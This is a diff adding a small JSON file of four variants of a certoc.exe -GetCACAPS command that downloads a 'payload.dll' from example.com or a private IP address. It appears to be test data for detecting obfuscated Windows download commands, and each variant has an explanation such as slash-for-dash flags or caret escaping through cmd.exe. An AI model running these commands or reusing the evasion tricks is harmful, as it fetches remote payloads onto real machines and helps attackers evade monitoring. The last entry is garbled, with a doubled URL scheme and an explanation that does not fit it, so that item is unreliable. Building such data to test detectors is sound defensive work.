@@ -1,0 +1,18 @@
+[
+  {
+    "output": "certoc.exe -GetCACAPS \"http://example.com/payload.dll\"",
+    "explanation": "Original command with quotes added around the URL for safe testing."
+  },
+  {
+    "output": "certoc.exe /GetCACAPS http://example.com/payload.dll",
+    "explanation": "Substitution of '-' with '/' for the flag, which is an equivalent syntax in Windows command-line tools."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS http://192.168.1.100/payload.ext",
+    "explanation": "Omission of quotes and substitution of URL to a local IP for safe testing."
+  },
+  {
+    "output": "cmd.exe /c \"certoc.exe -GetCACAPS h^t^t^p^:^/^/http://example.com/payload.dll\"",
+    "explanation": "Reordering and escaping characters in the URL for testing in a controlled environment."
+  }
+]
